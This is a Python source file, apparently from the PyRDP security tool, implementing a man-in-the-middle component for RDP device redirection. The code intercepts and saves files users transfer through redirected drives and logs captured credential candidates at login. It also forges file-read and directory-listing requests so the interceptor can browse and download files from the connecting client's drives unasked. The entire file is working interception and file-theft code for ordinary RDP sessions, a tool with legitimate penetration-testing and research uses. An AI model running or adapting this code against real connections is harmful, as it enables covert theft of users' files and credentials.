#
# This file is part of the PyRDP project.
# Copyright (C) 2019-2021 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from logging import LoggerAdapter
from typing import Dict, Optional, Union

from pyrdp.core import ObservedBy, Observer, Subject
from pyrdp.enum import CreateOption, DeviceRedirectionPacketID, DeviceType, DirectoryAccessMask, FileAccessMask, \
    FileAttributes, \
    FileCreateDisposition, FileCreateOptions, FileShareAccess, FileSystemInformationClass, IOOperationSeverity, \
    MajorFunction, MinorFunction
from pyrdp.layer import DeviceRedirectionLayer
from pyrdp.logging.StatCounter import StatCounter, STAT
from pyrdp.mitm.FileMapping import FileMapping
from pyrdp.mitm.state import RDPMITMState
from pyrdp.mitm.TCPMITM import TCPMITM
from pyrdp.pdu import DeviceAnnounce, DeviceCloseRequestPDU, DeviceCloseResponsePDU, DeviceCreateRequestPDU, \
    DeviceCreateResponsePDU, DeviceDirectoryControlResponsePDU, DeviceIORequestPDU, DeviceIOResponsePDU, \
    DeviceListAnnounceRequest, DeviceQueryDirectoryRequestPDU, DeviceQueryDirectoryResponsePDU, DeviceReadRequestPDU, \
    DeviceReadResponsePDU, DeviceRedirectionPDU


class DeviceRedirectionMITMObserver(Observer):
    def onDeviceAnnounce(self, device: DeviceAnnounce):
        pass

    def onFileDownloadResult(self, deviceID: int, requestID: int, path: str, offset: int, data: bytes):
        pass

    def onFileDownloadComplete(self, deviceID: int, requestID: int, path: str, error: int):
        pass

    def onDirectoryListingResult(self, deviceID: int, requestID: int, fileName: str, isDirectory: bool):
        pass

    def onDirectoryListingComplete(self, deviceID: int, requestID: int):
        pass


@ObservedBy(DeviceRedirectionMITMObserver)
class DeviceRedirectionMITM(Subject):
    """
    MITM component for the device redirection channel.
    It saves files transferred over RDP to a local directory. The files aren't named after their remote name to avoid
    conflicts. Rather, they are given a random name, and the mapping to their remote path is given by the mapping.json
    file. Each unique file (identified by its hash) is saved only once. Duplicates are removed to avoid filling the drive
    with identical files.
    """

    FORGED_COMPLETION_ID = 1000000

    def __init__(self, client: DeviceRedirectionLayer, server: DeviceRedirectionLayer, log: LoggerAdapter,
                 statCounter: StatCounter, state: RDPMITMState, tcp: TCPMITM):
        """
        :param client: device redirection layer for the client side
        :param server: device redirection layer for the server side
        :param log: logger for this component
        :param statCounter: stat counter object
        :param state: shared RDP MITM state
        :param tcp: TCP MITM component
        """
        super().__init__()

        self.client = client
        self.server = server
        self.state = state
        self.log = log
        self.statCounter = statCounter
        self.tcp = tcp
        self.mappings: Dict[(int, int), FileMapping] = {}
        self.filesystemRoot = self.config.filesystemDir / self.state.sessionID

        self.currentIORequests: Dict[(int, int), DeviceIORequestPDU] = {}
        self.forgedRequests: Dict[(int, int), DeviceRedirectionMITM.ForgedRequest] = {}

        if self.config.extractFiles:
            self.responseHandlers: Dict[MajorFunction, callable] = {
                MajorFunction.IRP_MJ_CREATE: self.handleCreateResponse,
                MajorFunction.IRP_MJ_READ: self.handleReadResponse,
                MajorFunction.IRP_MJ_CLOSE: self.handleCloseResponse,
            }
        else:
            self.responseHandlers = {}

        self.client.createObserver(
            onPDUReceived=self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived=self.onServerPDUReceived,
        )

        self.tcp.client.createObserver(
            onDisconnection=self.onDisconnection
        )

        self.tcp.server.createObserver(
            onDisconnection=self.onDisconnection
        )

    def deviceRoot(self, deviceID: int):
        return self.filesystemRoot / f"device{deviceID}"

    def createDeviceRoot(self, deviceID: int):
        path = self.deviceRoot(deviceID)
        path.mkdir(parents=True, exist_ok=True)
        return path

    @property
    def config(self):
        return self.state.config

    def onDisconnection(self, reason):
        for mapping in self.mappings.values():
            mapping.onDisconnection(reason)

    def onClientPDUReceived(self, pdu: DeviceRedirectionPDU):
        self.statCounter.increment(STAT.DEVICE_REDIRECTION, STAT.DEVICE_REDIRECTION_CLIENT)
        self.handlePDU(pdu, self.server)

    def onServerPDUReceived(self, pdu: DeviceRedirectionPDU):
        self.statCounter.increment(STAT.DEVICE_REDIRECTION, STAT.DEVICE_REDIRECTION_SERVER)
        self.handlePDU(pdu, self.client)

    def handlePDU(self, pdu: DeviceRedirectionPDU, destination: DeviceRedirectionLayer):
        """
        Handle the logic for a PDU and send the PDU to its destination.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        """
        dropPDU = False

        if isinstance(pdu, DeviceIORequestPDU) and destination is self.client:
            self.handleIORequest(pdu)
        elif isinstance(pdu, DeviceIOResponsePDU) and destination is self.server:
            dropPDU = (pdu.deviceID, pdu.completionID) in self.forgedRequests
            self.handleIOResponse(pdu)

        elif isinstance(pdu, DeviceListAnnounceRequest):
            self.handleDeviceListAnnounceRequest(pdu)

        elif isinstance(pdu, DeviceRedirectionPDU):
            if pdu.packetID == DeviceRedirectionPacketID.PAKID_CORE_USER_LOGGEDON:
                self.handleClientLogin()

        if not dropPDU:
            destination.sendPDU(pdu)

    def handleIORequest(self, pdu: DeviceIORequestPDU):
        """
        Keep track of IO requests that are active.
        :param pdu: the device IO request
        """

        self.statCounter.increment(STAT.DEVICE_REDIRECTION_IOREQUEST)
        key = (pdu.deviceID, pdu.completionID)
        self.currentIORequests[key] = pdu

    def handleIOResponse(self, pdu: DeviceIOResponsePDU):
        """
        Handle an IO response, depending on what kind of request originated it.
        :param pdu: the device IO response.
        """

        self.statCounter.increment(STAT.DEVICE_REDIRECTION_IORESPONSE)
        key = (pdu.deviceID, pdu.completionID)
        if key in self.forgedRequests:
            request = self.forgedRequests[key]
            request.handleResponse(pdu)

            if request.isComplete:
                self.forgedRequests.pop(key)

        elif key in self.currentIORequests:
            requestPDU = self.currentIORequests.pop(key)

            if pdu.ioStatus >> 30 == IOOperationSeverity.STATUS_SEVERITY_ERROR:
                self.statCounter.increment(STAT.DEVICE_REDIRECTION_IOERROR)
                self.log.warning("Received an IO Response with an error IO status: %(responsePDU)s for request %(requestPDU)s", {"responsePDU": repr(pdu), "requestPDU": repr(requestPDU)})

            if pdu.majorFunction in self.responseHandlers:
                self.responseHandlers[pdu.majorFunction](requestPDU, pdu)
        else:
            self.log.error("Received IO response to unknown request #%(completionID)d", {"completionID": pdu.completionID})

    def handleDeviceListAnnounceRequest(self, pdu: DeviceListAnnounceRequest):
        """
        Log mapped devices.
        :param pdu: the device list announce request.
        """

        for device in pdu.deviceList:
            self.log.info("%(deviceType)s mapped with ID %(deviceID)d: %(deviceName)s", {
                "deviceType": DeviceType.getPrettyName(device.deviceType),
                "deviceID": device.deviceID,
                "deviceName": device.preferredDOSName
            })

            self.createDeviceRoot(device.deviceID)
            self.observer.onDeviceAnnounce(device)

    def handleCreateResponse(self, request: DeviceCreateRequestPDU, response: DeviceCreateResponsePDU):
        """
        Prepare to intercept a file: create a FileMapping object, which will only create the file when we actually write
        to it. When listing a directory, Windows sends a lot of create requests without actually reading the files. We
        verify the request to avoid creating a lot of empty files whenever a directory is listed.
        :param request: the device create request
        :param response: the device IO response to the request
        """
        self.log.debug("Handling a DeviceCreateRequest. Path: '%(path)s'", {"path": request.path})

        isFileRead = request.desiredAccess & (FileAccessMask.GENERIC_READ | FileAccessMask.FILE_READ_DATA) != 0
        isDirectory = request.createOptions & CreateOption.FILE_NON_DIRECTORY_FILE == 0

        if isFileRead and not isDirectory:
            mapping = FileMapping.generate(request.path, self.config.fileDir, self.deviceRoot(response.deviceID), self.log)
            key = (response.deviceID, response.fileID)
            self.mappings[key] = mapping

    def handleReadResponse(self, request: DeviceReadRequestPDU, response: DeviceReadResponsePDU):
        """
        Write the data that was read at the appropriate offset in the file proxy.
        :param request: the device read request
        :param response: the device IO response to the request
        """
        key = (response.deviceID, request.fileID)

        if key in self.mappings:
            mapping = self.mappings[key]
            mapping.seek(request.offset)
            mapping.write(response.payload)

    def handleCloseResponse(self, request: DeviceCloseRequestPDU, response: DeviceCloseResponsePDU):
        """
        Close the file if it was open. Compute the hash of the file, then delete it if we already have a file with the
        same hash.
        :param request: the device close request
        :param response: the device IO response to the request
        """

        self.statCounter.increment(STAT.DEVICE_REDIRECTION_FILE_CLOSE)
        key = (response.deviceID, request.fileID)

        if key in self.mappings:
            mapping = self.mappings.pop(key)
            mapping.finalize()

    def handleClientLogin(self):
        """
        Handle events that should be triggered when a client logs in.
        """

        if self.state.credentialsCandidate or self.state.inputBuffer:
            self.log.info("Credentials candidate from heuristic: %(credentials_candidate)s", {
                "credentials_candidate" : (self.state.credentialsCandidate or self.state.inputBuffer)
            })

        # Deactivate the logger for this client
        self.state.loggedIn = True
        self.state.shiftPressed = False
        self.state.capsLockOn = False
        self.state.credentialsCandidate = ""
        self.state.inputBuffer = ""

    def findNextRequestID(self) -> int:
        """
        Find the next request ID to be returned for a forged request. Request ID's start from a different base than the
        IDs for normal RDPDR requests to avoid collisions. IDs are reused after their request has completed. What we
        call a "request ID" is the equivalent of the "completion ID" in RDPDR documentation.
        """
        completionID = DeviceRedirectionMITM.FORGED_COMPLETION_ID

        while completionID in [key[1] for key in self.forgedRequests]:
            completionID += 1

        return completionID

    def sendForgedFileRead(self, deviceID: int, path: str) -> int:
        """
        Send a forged requests for reading a file. Returns a request ID that can be used by the caller to keep track of
        which file the responses belong to. Results are sent by using the DeviceRedirectionMITMObserver interface.
        :param deviceID: ID of the target device.
        :param path: path of the file to download. The path should use '\' instead of '/' to separate directories.
        """

        if not self.config.extractFiles:
            self.log.info('Ignored attempt to forge file reads because file extraction is disabled.')
            return 0

        self.statCounter.increment(STAT.DEVICE_REDIRECTION_FORGED_FILE_READ)

        completionID = self.findNextRequestID()
        request = DeviceRedirectionMITM.ForgedFileReadRequest(deviceID, completionID, self, path)
        key = (deviceID, completionID)
        self.forgedRequests[key] = request

        request.send()
        return completionID

    def sendForgedDirectoryListing(self, deviceID: int, path: str) -> int:
        """
        Send a forged directory listing request. Returns a request ID that can be used by the caller to keep track of which
        file belongs to which directory. Results are sent by using the DeviceRedirectionMITMObserver interface.
        :param deviceID: ID of the target device.
        :param path: path of the directory to list. The path should use '\' instead of '/' to separate directories. It
        should also contain a pattern to match. For example: to list all files in the Documents folder, the path should be
        \Documents\*
        """

        if not self.config.extractFiles:
            self.log.info('Ignored attempt to forge directory listing because file extraction is disabled.')
            return 0

        self.statCounter.increment(STAT.DEVICE_REDIRECTION_FORGED_DIRECTORY_LISTING)

        completionID = self.findNextRequestID()
        request = DeviceRedirectionMITM.ForgedDirectoryListingRequest(deviceID, completionID, self, path)
        key = (deviceID, completionID)
        self.forgedRequests[key] = request

        request.send()
        return completionID

    class ForgedRequest:
        """
        Base class for forged requests that simulate the server asking for information.
        """

        def __init__(self, deviceID: int, requestID: int, mitm: 'DeviceRedirectionMITM'):
            """
            :param deviceID: ID of the device used.
            :param requestID: this request's ID.
            :param mitm: the parent MITM.
            """

            self.deviceID = deviceID
            self.requestID = requestID
            self.mitm: 'DeviceRedirectionMITM' = mitm
            self.fileID: Optional[int] = None
            self.isComplete = False
            self.handlers: Dict[MajorFunction, callable] = {
                MajorFunction.IRP_MJ_CREATE: self.onCreateResponse,
                MajorFunction.IRP_MJ_CLOSE: self.onCloseResponse,
            }

        def send(self):
            pass

        def sendCloseRequest(self):
            request = DeviceCloseRequestPDU(
                self.deviceID,
                self.fileID,
                self.requestID,
                0
            )

            self.sendIORequest(request)

        def sendIORequest(self, request: DeviceIORequestPDU):
            self.mitm.client.sendPDU(request)

        def complete(self):
            self.isComplete = True

        def handleResponse(self, response: DeviceIOResponsePDU):
            if response.majorFunction in self.handlers:
                self.handlers[response.majorFunction](response)

        def onCreateResponse(self, response: DeviceCreateResponsePDU):
            if response.ioStatus == 0:
                self.fileID = response.fileID

        def onCloseResponse(self, _: DeviceCloseResponsePDU):
            self.complete()

    class ForgedFileReadRequest(ForgedRequest):
        def __init__(self, deviceID: int, requestID: int, mitm: 'DeviceRedirectionMITM', path: str):
            """
            :param deviceID: ID of the device used.
            :param requestID: this request's ID.
            :param mitm: the parent MITM.
            :param path: path of the file to download.
            """
            super().__init__(deviceID, requestID, mitm)
            self.path = path
            self.handlers[MajorFunction.IRP_MJ_READ] = self.onReadResponse
            self.offset = 0

        def send(self):
            # Open the file
            request = DeviceCreateRequestPDU(
                self.deviceID,
                0,
                self.requestID,
                0,
                FileAccessMask.FILE_READ_DATA,
                0,
                FileAttributes.FILE_ATTRIBUTE_NONE,
                FileShareAccess(7), # read, write, delete
                FileCreateDisposition.FILE_OPEN,
                FileCreateOptions.FILE_NON_DIRECTORY_FILE,
                self.path
            )

            self.sendIORequest(request)

        def sendReadRequest(self):
            request = DeviceReadRequestPDU(
                self.deviceID,
                self.fileID,
                self.requestID,
                0,
                1024 * 16,
                self.offset
            )

            self.sendIORequest(request)

        def onCreateResponse(self, response: DeviceCreateResponsePDU):
            super().onCreateResponse(response)

            if self.fileID is None:
                self.handleFileComplete(response.ioStatus)
                return

            self.sendReadRequest()

        def onReadResponse(self, response: DeviceReadResponsePDU):
            if response.ioStatus != 0:
                self.handleFileComplete(response.ioStatus)
                return

            length = len(response.payload)

            if length == 0:
                self.handleFileComplete(0)
                return

            self.mitm.observer.onFileDownloadResult(self.deviceID, self.requestID, self.path, self.offset, response.payload)

            self.offset += length
            self.sendReadRequest()

        def handleFileComplete(self, error: int):
            self.mitm.observer.onFileDownloadComplete(self.deviceID, self.requestID, self.path, error)

            if self.fileID is None:
                self.complete()
            else:
                self.sendCloseRequest()

    class ForgedDirectoryListingRequest(ForgedRequest):
        def __init__(self, deviceID: int, requestID: int, mitm: 'DeviceRedirectionMITM', path: str):
            """
            :param deviceID: ID of the device used.
            :param requestID: this request's ID.
            :param mitm: the parent MITM.
            :param path: path to list.
            """
            super().__init__(deviceID, requestID, mitm)
            self.path = path
            self.handlers[MajorFunction.IRP_MJ_DIRECTORY_CONTROL] = self.onDirectoryControlResponse

        def send(self):
            if "*" not in self.path:
                openPath = self.path
            else:
                openPath = self.path[: self.path.index("*")]

            if openPath.endswith("\\"):
                openPath = openPath[: -1]

            # We need to start by opening the directory.
            request = DeviceCreateRequestPDU(
                self.deviceID,
                0,
                self.requestID,
                0,
                DirectoryAccessMask.FILE_LIST_DIRECTORY,
                0,
                FileAttributes.FILE_ATTRIBUTE_DIRECTORY,
                FileShareAccess(7), # read, write, delete
                FileCreateDisposition.FILE_OPEN,
                FileCreateOptions.FILE_DIRECTORY_FILE,
                openPath
            )

            self.sendIORequest(request)

        def onCreateResponse(self, response: DeviceCreateResponsePDU):
            super().onCreateResponse(response)

            if self.fileID is None:
                self.complete()
                return

            # Now that the file is open, start listing the directory.
            request = DeviceQueryDirectoryRequestPDU(
                self.deviceID,
                self.fileID,
                self.requestID,
                FileSystemInformationClass.FileBothDirectoryInformation,
                1,
                self.path
            )

            self.sendIORequest(request)

        def onDirectoryControlResponse(self, response: Union[DeviceDirectoryControlResponsePDU, DeviceQueryDirectoryResponsePDU]):
            if response.minorFunction != MinorFunction.IRP_MN_QUERY_DIRECTORY:
                return

            if response.ioStatus == 0:
                self.handleDirectoryListingResponse(response)
            else:
                self.handleDirectoryListingComplete(response)

        def handleDirectoryListingResponse(self, response: DeviceQueryDirectoryResponsePDU):
            for info in response.fileInformation:
                try:
                    isDirectory = info.fileAttributes & FileAttributes.FILE_ATTRIBUTE_DIRECTORY != 0
                except AttributeError:
                    isDirectory = False

                self.mitm.observer.onDirectoryListingResult(self.deviceID, self.requestID, info.fileName, isDirectory)

            # Send a follow-up request to get the next file (or a nonzero ioStatus, which will complete the listing).
            pdu = DeviceQueryDirectoryRequestPDU(
                self.deviceID,
                self.fileID,
                self.requestID,
                response.informationClass,
                0,
                ""
            )

            self.sendIORequest(pdu)

        def handleDirectoryListingComplete(self, _: DeviceQueryDirectoryResponsePDU):
            self.mitm.observer.onDirectoryListingComplete(self.deviceID, self.requestID)

            # Once we're done, we can close the file.
            self.sendCloseRequest()
